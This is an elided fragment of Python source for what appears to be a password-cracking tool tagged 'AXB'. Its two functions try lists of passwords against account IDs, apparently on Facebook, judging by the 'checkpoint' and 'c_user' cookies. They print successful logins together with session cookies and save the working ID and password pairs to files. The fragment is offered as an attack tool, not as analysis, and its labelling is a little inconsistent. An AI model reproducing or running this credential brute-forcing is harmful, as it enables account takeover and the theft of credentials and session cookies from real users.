...
def crack(idf,pwv,nmf):
    ...
    sys.stdout.write(f"\r {P}[AXB] {loop}|{len(id)} [OK:-{ok}]  | {U}{'{:.0%}'.format(loop/float(len(id)))}{P} "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\33[91m[AXB-CP] {idf}|{pw}')
                ...
                print(f'\r\33[92m[AXB-SUCCESSFUL] {idf}|{pw} | {kuki}')
...
def crack2(idf,pwv,nmf):
    ...
    for pw in pwv:
        try:
            ...
            if 'c_user' in ses.cookies.get_dict():
                print(f'\r\33[91m[AXB-CP] {idf}|{pw} | {kuki}')
                open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
                akun.append(idf+'|'+pw)
                cp+=1
                break
